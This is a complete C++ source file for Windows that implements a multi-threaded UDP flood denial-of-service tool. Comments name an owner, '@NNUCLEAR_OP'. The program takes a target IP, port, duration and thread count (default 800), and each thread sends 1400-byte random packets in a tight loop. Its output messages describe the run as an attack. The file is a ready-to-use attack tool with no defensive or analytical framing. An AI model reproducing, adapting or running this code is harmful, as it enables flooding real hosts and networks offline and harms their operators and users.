#include <iostream> //#THIS FILE OWNER IS @NNUCLEAR_OP
#include <cstring>  //#THIS FILE OWNER IS @NNUCLEAR_OP
#include <cstdlib>  //#THIS FILE OWNER IS @NNUCLEAR_OP
#include <ctime>    //#THIS FILE OWNER IS @NNUCLEAR_OP
#include <winsock2.h> //# For Windows sockets
#include <ws2tcpip.h> //# For InetPton and related functions
#include <vector>   //#THIS FILE OWNER IS @NNUCLEAR_OP
#include <thread>   //#THIS FILE OWNER IS @NNUCLEAR_OP
#include <mutex>    //#THIS FILE OWNER IS @NNUCLEAR_OP

#pragma comment(lib, "ws2_32.lib") //# Link winsock library

#define PAYLOAD_SIZE 1400          //# Latest payload size
#define DEFAULT_THREAD_COUNT 800   //# Default thread count

std::mutex log_mutex;

// Function to generate a random payload for UDP packets
void generate_payload(char *buffer, size_t size) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < size; ++i) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

// Function to send UDP packets in a single thread
void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
    sockaddr_in server_addr{};
    char buffer[PAYLOAD_SIZE];

    // Initialize Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cerr << "Thread " << thread_id << " - Error: WSAStartup failed. Code: " << WSAGetLastError() << std::endl;
        return;
    }

    // Create a UDP socket
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Thread " << thread_id << " - Error: Unable to create socket. " << WSAGetLastError() << std::endl;
        WSACleanup();
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    // Use inet_addr for compatibility
    server_addr.sin_addr.s_addr = inet_addr(ip);
    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        std::cerr << "Thread " << thread_id << " - Error: Invalid IP address - " << ip << std::endl;
        closesocket(sock);
        WSACleanup();
        return;
    }

    generate_payload(buffer, PAYLOAD_SIZE);

    time_t start_time = time(nullptr);
    while (time(nullptr) - start_time < attack_time) {
        int sent = sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent == SOCKET_ERROR) {
            std::cerr << "Thread " << thread_id << " - Error: Failed to send packet. " << WSAGetLastError() << std::endl;
        }
    }

    closesocket(sock);
    WSACleanup();

    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "Thread " << thread_id << " completed its attack." << std::endl;
}

// Function to run the UDP attack in multiple threads
void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int thread_count) {
    std::vector<std::thread> threads;

    std::cout << "Launching multi-threaded UDP flood attack with " << thread_count << " threads...\n";

    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(udp_attack_thread, ip, port, attack_time, i + 1);
    }

    for (auto &thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    std::cout << "Multi-threaded attack completed." << std::endl;
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 4 && argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time> [Threads]" << std::endl;
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int thread_count = (argc == 5) ? std::stoi(argv[4]) : DEFAULT_THREAD_COUNT;

    multi_threaded_udp_attack(ip, port, duration, thread_count);

    return EXIT_SUCCESS;
}
